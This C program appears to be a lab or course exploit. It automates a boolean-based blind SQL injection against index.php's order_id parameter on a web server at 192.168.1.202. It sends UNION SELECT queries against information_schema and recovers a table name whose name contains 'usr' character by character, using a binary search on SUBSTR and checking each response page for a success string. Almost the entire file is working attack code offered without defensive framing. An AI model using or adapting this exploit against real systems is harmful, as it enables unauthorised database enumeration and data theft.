#define __MY_DEBUG__
#include <limits.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netinet/ip.h>

#define WEB_ADDR 192, 168, 1, 202

union address {
    uint8_t fields[4];
    uint32_t l;
};

int32_t create_socket() {
    int32_t sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd <= 0) {
        #ifdef __MY_DEBUG__
                printf("create socket failed...\n");
        #endif
                close(sockfd);
                exit(0);
    }

    return sockfd;
}

void _listen(const int32_t sockfd) {
    if (listen(sockfd, 5) < 0) {
#ifdef __MY_DEBUG__
        printf("listen failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

void _bind(const int32_t sockfd, const uint8_t field0, const uint8_t field1,
           const uint8_t field2, const uint8_t field3, const uint16_t port) {
    struct sockaddr_in addr_in = {0};

    addr_in.sin_family = AF_INET;
    const union address address = {{field0, field1, field2, field3}};
    addr_in.sin_addr.s_addr = address.l;

    addr_in.sin_port = htons(port);

    if (bind(sockfd, (struct sockaddr *) &addr_in, sizeof(addr_in)) < 0) {
#ifdef __MY_DEBUG__
        printf("bind failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

int32_t _accept(const int32_t sockfd) {
    struct sockaddr addr = {0};
    socklen_t addrlen = sizeof(addr);
    int32_t clientfd = accept(sockfd, &addr, &addrlen);
    if (clientfd < 0) {
#ifdef __MY_DEBUG__
        printf("accept failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
    return clientfd;
}

size_t _recv(const int32_t sockfd, void *  buf, size_t size) {
    ssize_t sz = recv(sockfd, buf, size, 0);
    if (sz < 0) {
#ifdef __MY_DEBUG__
        printf("recv failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
    return (size_t)sz;
}

FILE *_fopen(const char *restrict path) {
    FILE * file = fopen(path, "w");
    if (file == 0) {
        #ifdef __MY_DEBUG__
                printf("fopen failed...\n");
        #endif
                exit(0);
    }
    return file;
}

size_t _fwrite(const void *restrict ptr, size_t size, size_t nitems, FILE *restrict stream) {
    size_t written = fwrite(ptr, size, nitems, stream);

    if (written < nitems) {
        #ifdef __MY_DEBUG__
            printf("fwrite failed...\n");
        #endif
        exit(0);
    }

    return written;
}

void _sendto(const int32_t sockfd, const void *const buff, size_t buff_size,
             const uint8_t field0, const uint8_t field1,
             const uint8_t field2, const uint8_t field3, const uint16_t port) {
    struct sockaddr_in addr_in = {0};

    addr_in.sin_family = AF_INET;
    const union address address = {{field0, field1, field2, field3}};
    addr_in.sin_addr.s_addr = address.l;

    addr_in.sin_port = htons(port);

    if (sendto(sockfd, buff, buff_size, 0, (struct sockaddr *) &addr_in, sizeof(addr_in)) < 0) {
#ifdef __MY_DEBUG__
        printf("sendto failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

void _connect(const int32_t sockfd, const uint8_t field0, const uint8_t field1,
           const uint8_t field2, const uint8_t field3, const uint16_t port) {
    struct sockaddr_in addr_in = {0};

    addr_in.sin_family = AF_INET;
    const union address address = {{field0, field1, field2, field3}};
    addr_in.sin_addr.s_addr = address.l;

    addr_in.sin_port = htons(port);

    if (connect(sockfd, (struct sockaddr *) &addr_in, sizeof(addr_in)) < 0) {
#ifdef __MY_DEBUG__
        printf("connect failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

void _send(const int32_t client, const void * const data, size_t size) {
    if (0 > send(client, data, size, 0)) {
#ifdef __MY_DEBUG__
        perror("Sending failed...\n");
#endif
        close(client);
        exit(0);
    }
}

bool recv_empty(int32_t sockfd) {
    enum {
        CHUNK = 16
    };
    char * buf = malloc(CHUNK);
    size_t size = 0;
    *buf = 0;
    char *header_end=0;
    size_t recvd;

    while (1) {
        recvd = _recv(sockfd, buf + size, CHUNK - 1);
        if (!recvd) {
            break;
        }

        size += recvd;
        buf = realloc(buf, size+CHUNK);
        buf[size] = 0;

        header_end = strstr(buf, "\r\n\r\n");

        if (header_end) {
            break;
        }
    }
    char Content_Length[] = "Content-Length: ";
    size_t content_len = (size_t)atoi(strstr(buf, Content_Length) + sizeof(Content_Length)-1);
    size_t body_recvd = size - (size_t)(header_end+4-buf); //how much we already received from the body after the header ends
    size_t body_left = content_len - body_recvd;
    buf = realloc(buf, body_left+size+1);
    recvd = _recv(sockfd, buf + size, body_left);
    size = size + recvd;

    const char *ptr = strstr(buf, "Your order has been sent!");

    #ifdef __MY_DEBUG__
        //puts(buf);
    #endif

    free(buf);

    return ptr;
}

#define PAYLOAD "order_id=0%%20UNION%%20SELECT%%20table_name%%20FROM%%20information_schema.TABLES%%20WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20AND%%20table_name%%20LIKE%%20%%27%s%%%%25%%27%%20AND%%20SUBSTR(%s,%i,1)<%c%%20LIMIT%%201%;"

bool send_check_success(char * discovered_name, int i, char mid, int sockfd) {
    char mal_req[2048];
    sprintf(mal_req, "GET /index.php?order_id=0%%20UNION%%20SELECT%%20table_name%%20FROM%%20information_schema.TABLES%%20WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20AND%%20table_name%%20LIKE%%20%%27%s%%25%%27%%20AND%%20SUBSTR(table_name,%i,1)>%%3d%%27%c%%27%%20LIMIT%%201; HTTP/1.1\r\n"
        "Host: 192.168.1.202\r\n"
        "Connection: Keep-Alive\r\n"
        "\r\n",
        discovered_name, i, mid
    );
    _send(sockfd, mal_req, strlen(mal_req));

    return recv_empty(sockfd);
}


void binary_search(char * discovered_name, int sockfd) {
#ifdef __MY_DEBUG__
    int count = 0;
#endif
    char mid;
    for (int i = 0; i < 10; i++) {
        printf("%i--\n", i);
        char low = 'a';
        char high = 'z';
        while (low < high) {
            mid = (char)(low + (high - low) / 2);
        #ifdef __MY_DEBUG__
            count++;
        #endif
            if (send_check_success(discovered_name, i, mid, sockfd)) {
                low=mid+1;
            }
            else {
                high=mid-1;
            }
            printf("\t%s,%c,%c\n", discovered_name, low, high);
        }
        discovered_name[i] = low;
    }
#ifdef __MY_DEBUG__
    printf("number of queries is: %d\n",count);
#endif
}

int32_t main() {
    int32_t sockfd = create_socket();

    _connect(sockfd, WEB_ADDR, 80);

    char table_name[11] = {0};

    binary_search(table_name, sockfd);

#ifdef __MY_DEBUG__
    puts(table_name);
#endif

    close(sockfd);
}
